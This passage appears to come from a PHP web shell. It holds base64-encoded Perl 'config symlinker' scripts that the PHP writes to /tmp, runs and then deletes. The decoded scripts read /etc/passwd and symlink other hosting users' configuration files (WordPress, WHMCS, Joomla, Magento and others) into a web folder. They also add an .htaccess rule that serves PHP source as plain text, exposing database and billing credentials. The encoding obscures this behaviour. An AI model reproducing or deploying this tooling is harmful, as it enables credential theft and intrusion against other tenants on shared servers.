yIuJDEuIi9wdWJsaWNfaHRtbC9zdXBwb3J0L29yZGVyL3N1Ym1pdHRpY2tldC5waHAiLCJpZHhfc3ltLyIuJDEuIi1XSE1DUy50eHQiKTsNCgkJc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL2JiLWNvbmZpZy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Cb3hCaWxsaW5nLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvYm94YmlsbGluZy9iYi1jb25maWcucGhwIiwiaWR4X3N5bS8iLiQxLiItQm94QmlsbGluZy50eHQiKTsNCgkJc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL2JveC9iYi1jb25maWcucGhwIiwiaWR4X3N5bS8iLiQxLiItQm94QmlsbGluZy50eHQiKTsNCgkJc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL2hvc3QvYmItY29uZmlnLnBocCIsImlkeF9zeW0vIi4kMS4iLUJveEJpbGxpbmcudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9Ib3N0L2JiLWNvbmZpZy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Cb3hCaWxsaW5nLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvc3VwcG9ydGVzL2JiLWNvbmZpZy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Cb3hCaWxsaW5nLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvc3VwcG9ydC9iYi1jb25maWcucGhwIiwiaWR4X3N5bS8iLiQxLiItQm94QmlsbGluZy50eHQiKTsNCgkJc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL2hvc3RpbmcvYmItY29uZmlnLnBocCIsImlkeF9zeW0vIi4kMS4iLUJveEJpbGxpbmcudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9jYXJ0L2JiLWNvbmZpZy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Cb3hCaWxsaW5nLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvb3JkZXIvYmItY29uZmlnLnBocCIsImlkeF9zeW0vIi4kMS4iLUJveEJpbGxpbmcudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9jbGllbnQvYmItY29uZmlnLnBocCIsImlkeF9zeW0vIi4kMS4iLUJveEJpbGxpbmcudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9jbGllbnRzL2JiLWNvbmZpZy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Cb3hCaWxsaW5nLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvY2xpZW50ZS9iYi1jb25maWcucGhwIiwiaWR4X3N5bS8iLiQxLiItQm94QmlsbGluZy50eHQiKTsNCgkJc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL2NsaWVudGVzL2JiLWNvbmZpZy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Cb3hCaWxsaW5nLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvYmlsbGluZy9iYi1jb25maWcucGhwIiwiaWR4X3N5bS8iLiQxLiItQm94QmlsbGluZy50eHQiKTsNCgkJc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL2JpbGxpbmdzL2JiLWNvbmZpZy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Cb3hCaWxsaW5nLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvbXkvYmItY29uZmlnLnBocCIsImlkeF9zeW0vIi4kMS4iLUJveEJpbGxpbmcudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9zZWN1cmUvYmItY29uZmlnLnBocCIsImlkeF9zeW0vIi4kMS4iLUJveEJpbGxpbmcudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9zdXBwb3J0L29yZGVyL2JiLWNvbmZpZy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Cb3hCaWxsaW5nLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwIiwiaWR4X3N5bS8iLiQxLiItWmVuY2FydC50eHQiKTsNCgkJc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL3plbmNhcnQvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwIiwiaWR4X3N5bS8iLiQxLiItWmVuY2FydC50eHQiKTsNCgkJc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL3Byb2R1Y3RzL2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCIsImlkeF9zeW0vIi4kMS4iLVplbmNhcnQudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9jYXJ0L2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCIsImlkeF9zeW0vIi4kMS4iLVplbmNhcnQudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9zaG9wL2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCIsImlkeF9zeW0vIi4kMS4iLVplbmNhcnQudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9pbmNsdWRlcy9pc280MjE3LnBocCIsImlkeF9zeW0vIi4kMS4iLUhvc3RiaWxscy50eHQiKTsNCgkJc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL2hvc3RiaWxscy9pbmNsdWRlcy9pc280MjE3LnBocCIsImlkeF9zeW0vIi4kMS4iLUhvc3RiaWxscy50eHQiKTsNCgkJc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL2hvc3QvaW5jbHVkZXMvaXNvNDIxNy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Ib3N0YmlsbHMudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9Ib3N0L2luY2x1ZGVzL2lzbzQyMTcucGhwIiwiaWR4X3N5bS8iLiQxLiItSG9zdGJpbGxzLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvc3VwcG9ydGVzL2luY2x1ZGVzL2lzbzQyMTcucGhwIiwiaWR4X3N5bS8iLiQxLiItSG9zdGJpbGxzLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvc3VwcG9ydC9pbmNsdWRlcy9pc280MjE3LnBocCIsImlkeF9zeW0vIi4kMS4iLUhvc3RiaWxscy50eHQiKTsNCgkJc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL2hvc3RpbmcvaW5jbHVkZXMvaXNvNDIxNy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Ib3N0YmlsbHMudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9jYXJ0L2luY2x1ZGVzL2lzbzQyMTcucGhwIiwiaWR4X3N5bS8iLiQxLiItSG9zdGJpbGxzLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvb3JkZXIvaW5jbHVkZXMvaXNvNDIxNy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Ib3N0YmlsbHMudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9jbGllbnQvaW5jbHVkZXMvaXNvNDIxNy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Ib3N0YmlsbHMudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9jbGllbnRzL2luY2x1ZGVzL2lzbzQyMTcucGhwIiwiaWR4X3N5bS8iLiQxLiItSG9zdGJpbGxzLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvY2xpZW50ZS9pbmNsdWRlcy9pc280MjE3LnBocCIsImlkeF9zeW0vIi4kMS4iLUhvc3RiaWxscy50eHQiKTsNCgkJc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL2NsaWVudGVzL2luY2x1ZGVzL2lzbzQyMTcucGhwIiwiaWR4X3N5bS8iLiQxLiItSG9zdGJpbGxzLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvYmlsbGluZy9pbmNsdWRlcy9pc280MjE3LnBocCIsImlkeF9zeW0vIi4kMS4iLUhvc3RiaWxscy50eHQiKTsNCgkJc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL2JpbGxpbmdzL2luY2x1ZGVzL2lzbzQyMTcucGhwIiwiaWR4X3N5bS8iLiQxLiItSG9zdGJpbGxzLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvbXkvaW5jbHVkZXMvaXNvNDIxNy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Ib3N0YmlsbHMudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9zZWN1cmUvaW5jbHVkZXMvaXNvNDIxNy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Ib3N0YmlsbHMudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9zdXBwb3J0L29yZGVyL2luY2x1ZGVzL2lzbzQyMTcucGhwIiwiaWR4X3N5bS8iLiQxLiItSG9zdGJpbGxzLnR4dCIpOw0KCQlzeW1saW5rKCIvIiwiaWR4X3N5bS9yb290Iik7DQoJCXByaW50ICQxLiItIjsNCgl9DQp9DQoNCm9wZW4oT1VULCI+aWR4X3N5bS8uaHRhY2Nlc3MiKTsNCnByaW50IE9VVCAiT3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBpbmRveHBsb2l0Lmh0bQ0KQWRkVHlwZSB0ZXh0L3BsYWluIC5waHANCkFkZEhhbmRsZXIgdGV4dC9wbGFpbiAucGhwDQpTYXRpc2Z5IEFueSI7DQpjbG9zZShPVVQpOw0KcHJpbnQgJzxjZW50ZXI+PGgxPjxhIGhyZWY9ImlkeF9zeW0iIHRhcmdldD0iX0JMQU5LIj5DbGljayBIZXJlPC9hPjwvaDE+JzsNCnVubGluaygkMCk7";
				save("/tmp/symlink.pl", "w", base64_decode($sym['code']));
				exe("perl /tmp/symlink.pl");
				sleep(1);
				@unlink("/tmp/symlink.pl");
				@unlink("passwd.txt");
				@unlink("idx_sym/pas.txt");
			}

			print "<div style='background: #ffffff; width: 100%; height: 100%'>";
			print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_sym/' frameborder='0' scrolling='yes'></iframe>";
			print "</div>";
		}
		else {
			if($args[0] === "404") {
				if(!is_dir(path()."/idx_sym404/")) {
					$sym['code'] = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQojICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjIA0KIw0KIwkJTmFtZSA6IFBlcmwvQ0dJIENvbmZpZyBTeW1saW5rZXIgKFdpdGggQXV0byBCeXBhc3MgU3ltbGluayA0MDQpDQojCQlWZXJzaW9uIDogMS4yDQojCQlDcmVhdGVkIDogOSBNZWkgMjAxNw0KIwkJQXV0aG9yIDogMHgxOTk5DQojCQlUaGFua3MgVG8gOiAweElEaW90ICwgSW5kb25lc2lhbiBDb2RlIFBhcnR5ICwgSmF0aW00dQ0KIwkJTW9yZSBJbmZvIDogaHR0cDovLzB4RGFyay5ibG9nc3BvdC5jb20NCiMJCVdhbnQgdG8gcmVjb2RlID8gRG9uJ3QgZm9yZ2V0IG15IG5pY2sgbmFtZSAgOikNCiMJCWh0dHA6Ly9mYWNlYm9vay5jb20vbWVsZXguMWQNCiMJCQ0KIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyANCg0KdXNlIEZpbGU6OkNvcHk7DQp1c2Ugc3RyaWN0Ow0KdXNlIHdhcm5pbmdzOw0KdXNlIE1JTUU6OkJhc2U2NDsNCmNvcHkoIi9ldGMvcGFzc3dkIiwicGFzc3dkLnR4dCIpIDsNCm1rZGlyICJpZHhfc3ltNDA0IjsNCnN5bWxpbmsoIi8iLCJpZHhfc3ltNDA0L3Jvb3QiKTsNCm15ICRmaWxlbmFtZSA9ICdwYXNzd2QudHh0JzsNCm15ICRodGFjY2VzcyA9IGRlY29kZV9iYXNlNjQoIlQzQjBhVzl1Y3lCSmJtUmxlR1Z6SUVadmJHeHZkMU41YlV4cGJtdHpEUXBFYVhKbFkzUnZjbmxKYm1SbGVDQnBibVJ2ZUhCc2IybDBMbWgwYlEwS1FXUmtWSGx3WlNCMFpYaDBMM0JzWVdsdUlDNXdhSEFnRFFwQlpHUklZVzVrYkdWeUlIUmxlSFF2Y0d4aGFXNGdMbkJvY0EwS1UyRjBhWE5tZVNCQmJua05Da2x1WkdWNFQzQjBhVzl1Y3lBclEyaGhjbk5sZEQxVlZFWXRPQ0FyUm1GdVkzbEpibVJsZUdsdVp5QXJTV2R1YjNKbFEyRnpaU0FyUm05c1pHVnljMFpwY25OMElDdFlTRlJOVENBclNGUk5URlJoWW14bElDdFRkWEJ3Y21WemMxSjFiR1Z6SUN0VGRYQndjbVZ6YzBSbGMyTnlhWEIwYVc5dUlDdE9ZVzFsVjJsa2RHZzlLaUFOQ2tGa1pFbGpiMjRnSjJSaGRHRTZhVzFoWjJVdmNHNW5PMkpoYzJVMk5DeHBWa0pQVW5jd1MwZG5iMEZCUVVGT1UxVm9SVlZuUVVGQlFrRkJRVUZCVVVOQldVRkJRVUZtT0M4NWFFRkJRVUZDU0U1RFUxWlJTVU5CWjBsbVFXaHJhVUZCUVVGQmJIZFRSbXg2UVVGQlRqRjNRVUZFWkdOQ1VXbHBZbVZCUVVGQlFtd3dVbFpvTUZVeU9XMWtTR1JvWTIxVlFXUXpaRE5NYld4MVlUTk9hbGxZUW14TWJUbDVXalYyZFZCQ2IwRkJRVVpWVTFWU1FsWkVhVTV3V2tzNVUyZE9Ra1pKV0ZCMldFNXVaR3BqVW05d1dEUlZOR3RYVm5JMVFVTm9WVGRJT0VKVFprbDBRVWhyUWpsRFdITnlWekJIZDBWUmRGSjNWa3ROVW5SQlZUaGFZMWxYWVU1dFRUSlBlSEY1ZVdsWldtUmpSMGxoV2pSYU56ZE5aV1ZSWTNjMlJFWkJMMVZFVlVGQldVaElhamhvVDBGVWFqbHZVbE5sTWxveFpqSkxhbEF4Wm1kTWEyNU5VRk0xYkZjd1ZtazBjRnB2Y0haSVdFUlhLMGxvVDNJNU9XZFlWSHByY2pseGRsUkNUWFJ5VG1RNFFYTk1WbU52YlZwTFJGQTJNV3RGVEdsb1IwbEtPVkZDWjA4eWFtUnpTVVV2U21JMVQyRmpSMFpCZDBSUlJXVk5SVTlhYm1neFJYRk5RMmgwVTBJNFlUWTBRbGN5VFU1b04xRldhV2hEUjB0alRraHpkMjFhTUd4QmExbEllRVkwVVdoQ1VFTkxTVmxTVlRsc05qQTFTMjFIUTBWSlZWbDZkRU5aVFVKbWEwVnFSMW8wVDJsSWQxSlJSaXQyYTFGSEszQjBRVU5KUmxKRlNsWlFVVUYyUm1ZclFuSnFiM2xSSzBOYVpuRnhNVEU0UkZKR1JXaHFaV0ppWW1Wc05tUkhhWGxVY1dZcmRsTnlhMkZTVVM4d2RYUk1OMjFJV0d3NWRuRXJaVkF6Vlc1aWFDOUlOV2RFUzJsUFJqWTNXV1ZpV1RCa1UwcGpVa0p0TUhveWNrWnNNbmxYY0RoQlZrUkpWek15WkdFM2NFeEJRVUZCUVVWc1JsUnJVM1ZSYlVOREp5QmVYa1JKVWtWRFZFOVNXVjVlRFFwRVpXWmhkV3gwU1dOdmJpQW5aR0YwWVRwcGJXRm5aUzl3Ym1jN1ltRnpaVFkwTEdsV1FrOVNkekJMUjJkdlFVRkJRVTVUVldoRlZXZEJRVUZDUVVGQlFVRlJRMEZaUVVGQlFXWTRMemxvUVVGQlFVRllUbE5TTUVsQmNuTTBZelpSUVVGQlFWcHBVekJrUlVGUU9FRXZkMFF2YjB3eWJtdDNRVUZCUVd4M1UwWnNla0ZCUVV4RmQwRkJRM2hOUWtGS2NXTkhRVUZCUVVGa01GTlZNVVpDT1c5S1FtaGpWRXAyTWtJeVpEUkJRVUZLVFZOVlVrSldSR3BNWWxwUE9WUm9lRnBGU1ZjdmNXeDJaSFJOTXpoQ1RtZEtVVzFSWjBwSFpDdEJMMDFSUWt4M1IycHBkMGd6Ym5ka2ExTk1kRTh5ZUVWU1J6Vk1jWGhZVWxOSlVqSlpSR1pFTkVkclIwMHdVRE55WWpSaU9WQkJlakJzTjNCVGJGZHNWekJtYm01TWIyeEJTVkJDTkZCWWFEUmxSblZ1ZFdOQlNVbE1kMlJGVTJWYWVVRnBabTV3Tml0MU9XOU9URzh6WjAwelRucFVaRWhTS3k4dmVuWktUWHBUZVVwTFMyOWthVWxuT0VGWVlYaGxTWG94WWtSYU4wMTRjVTVtZEdkVFZWSkVWM2szVEZWdVdqQmtXVzE0UVVaQlZrVnNTVFpCUlVONVowbHpVVkZ6YVhwTVFrOUJRa0ZFVDJwTFFYQnhhRGQxTjBkdlExVlhhWGRaWW1WMGIxVkljbkpRWTNkRGNXOUdNa3RWWlZoTWVrVjZRbll3SzNWUmJWTklUVVZhT1VZMlUxcGpjalpwTkVselFrOWhMMkkzU0ZGTllVaDBTVUYzWjB4a1NHRnNSRUV4WlhZd1pWRmlVMnB5UlhKUmQwcHdjVVkwWlVGNEwyaHZjVVF4TXpKdFRXdEtjbWsxZFZOUGJFWm9SV2h3VlZGSmFXOXFkMkZ0VDBST2MyeHFabFZYUTNGd1RHNVBZV0ZEVTB0S2RHNWhRa056V2xscVFXeHNiVmhKTkhaaFpXOWhWbGd3WTJKVFpHaHRWVkl6ZWtGTGRrNXFXVFpXYVc5dk1IUlhlbWRGYjI1TFlsY3JTMnRIVjNRelZXNTBNRU5sUjJaS2N6bG5LMVZWTUhKRlIwaElMMGgzTDAxcVNEWXZWQ3RRVDJSR2IxSk9TME5vVFRJeWVHMVBVR1Z6Y0dwUVIxRTJTSEJPVVRJM2REWnpRVU5FVTA1aGJubHZiR3BFVEVWa1ZtRkdUMHhsT0ZwclZXcExOWFZyY1ROME56bHNVRU0zTDA5RWF6VkhZU3RaTms4MVRYRjViVTUzTTFZeGVUTm9lWHBtV0RCb2NYWktUSGxpV0Vaa0t5dG1NbVF6WkRCa2JYTXJjWFpuTkU5RWVqaG1TSGd3TDB4elltVXpPVFkwYzFNM0t6UjFSV3AxYm5CeGJWTmxObVV6UkROT05TOU9NRmRhWW5Sc2VUbG1NRGx1V2pKYUwySXlPWFl5Wmt4RlpYWjJTemx4ZGpkak1uUnZTMms0VldscFVXbHhTR0p0Tm5KcFZ6WmhNVE5tYml0NmRqY3pLMjl4YjNKb1kweG5TMVZHV0ZaUUsyWnVOVElyVEc5dWFqaEpURW93VURoYVNVTkRSamt2VUZSd1EyeG9jRUoyWjFCbGJHOU1PVlUxTlU1SlFVRkJRVUZCVTFWV1QxSkxOVU5aU1VrOUp3MEtTVzVrWlhoSloyNXZjbVVnS2k1MGVIUTBNRFFOQ2tsdVpHVjRVM1I1YkdWVGFHVmxkQ0FuYUhSMGNEb3ZMMlYyWlc1MExtbHVaRzk0Y0d4dmFYUXViM0l1YVdRdmMzbHRiR2x1YXk1amMzTW5EUXBTWlhkeWFYUmxSVzVuYVc1bElFOXVEUXBTWlhkeWFYUmxRMjl1WkNBbGUxSkZVVlZGVTFSZlJrbE1SVTVCVFVWOUlGNHVLakI0YzNsdE5EQTBJRnRPUTEwTkNsSmxkM0pwZEdWU2RXeGxJRnd1ZEhoMEpDQWxlMUpGVVZWRlUxUmZWVkpKZlRRd05DQmJUQ3hTUFRNd01pNU9RMTA9Iik7DQpteSAkc3ltID0gZGVjb2RlX2Jhc2U2NCgiVDNCMGFXOXVjeUJKYm1SbGVHVnpJRVp2Ykd4dmQxTjViVXhwYm10ekRRcEVhWEpsWTNSdmNubEpibVJsZUNCcGJtUnZlSEJzYjJsMExtaDBiUTBLU0dWaFpHVnlUbUZ0WlNBd2VERTVPVGt1ZEhoMERRcFRZWFJwYzJaNUlFRnVlUTBLU1c1a1pYaFBjSFJwYjI1eklFbG5ibTl5WlVOaGMyVWdSbUZ1WTNsSmJtUmxlR2x1WnlCR2IyeGtaWEp6Um1seWMzUWdUbUZ0WlZkcFpIUm9QU29nUkdWelkzSnBjSFJwYjI1WGFXUjBhRDBxSUZOMWNIQnlaWE56U0ZSTlRGQnlaV0Z0WW14bERRcEpibVJsZUVsbmJtOXlaU0FxRFFwSmJtUmxlRk4wZVd4bFUyaGxaWFFnSjJoMGRIQTZMeTlsZG1WdWRDNXBibVJ2ZUhCc2IybDBMbTl5TG1sa0wzTjViV3hwYm1zdVkzTnpKdz09Iik7DQpvcGVuKG15ICRmaDEsICc+JywgJ2lkeF9zeW00MDQvLmh0YWNjZXNzJyk7DQpwcmludCAkZmgxICIkaHRhY2Nlc3MiOw0KY2xvc2UgJGZoMTsNCm9wZW4obXkgJHh4LCAnPicsICdpZHhfc3ltNDA0L25lbXUudHh0Jyk7DQpwcmludCAkeHggIiRzeW0iOw0KY2xvc2UgJHh4Ow0Kb3BlbihteSAkZmgsICc8OmVuY29kaW5nKFVURi04KScsICRmaWxlbmFtZSk7DQp3aGlsZSAobXkgJHJvdyA9IDwkZmg+KSB7DQpteSBAbWF0Y2hlcyA9ICRyb3cgPX4gLyguKj8pOng6L2c7DQpteSAkdXNlcm55YSA9ICQxOw0KbXkgQGFycmF5ID0gKA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy8uYWNjZXNzaGFzaCcsIHR5cGUgPT4gJ1dITS1hY2Nlc3NoYXNoJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jb25maWcva29uZWtzaS5waHAnLCB0eXBlID0+ICdMb2tvbWVkaWEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NvbmZpZy9zZXR0aW5ncy5pbmMucGhwJywgdHlwZSA9PiAnUHJlc3RhU2hvcCcgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYXBwL2V0Yy9sb2NhbC54bWwnLCB0eXBlID0+ICdNYWdlbnRvJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25maWcucGhwJywgdHlwZSA9PiAnT3BlbkNhcnQnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2FwcGxpY2F0aW9uL2NvbmZpZy9kYXRhYmFzZS5waHAnLCB0eXBlID0+ICdFbGxpc2xhYicgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd3AvdGVzdC93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JldGEvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcG9ydGFsL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NpdGUvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd3Avd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV1Avd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbmV3cy93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdGVzdC93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9kZW1vL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2hvbWUvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdjEvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdjIvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcHJlc3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbmV3L3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Jsb2dzL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ibG9nL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnXldITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JldGEvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3BvcnR